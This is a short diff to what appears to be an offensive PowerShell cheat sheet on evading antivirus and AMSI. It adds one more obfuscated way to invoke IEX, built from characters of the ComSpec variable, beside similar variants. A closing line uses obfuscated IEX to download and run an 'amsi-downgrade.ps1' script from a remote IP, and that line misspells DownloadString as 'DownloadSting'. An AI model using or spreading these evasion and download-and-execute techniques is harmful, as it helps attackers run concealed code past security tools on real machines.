@@ -1091,6 +1091,7 @@ Rename binary.exe beeing flagged by AV to .MSC extenssion to be abble to execute
 Concatenated IEX API call
 
     &(DIR Alias:/I*X)'Get-Service'                           # IEX 'Get-Service'
+    &($Env:ComSpec[4,15,25] -Join '') Get-Service            # IEX 'Get-Service'
     &($Env:PATH[4,15] + "X" -Join '') Get-Service            # IEX 'Get-Service'
     &(''.SubString.ToString()[67,72,64]-Join'')'Get-Service' # IEX 'Get-Service'
     &(''.SubString.ToString()[67,72,64]-Join'') (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')
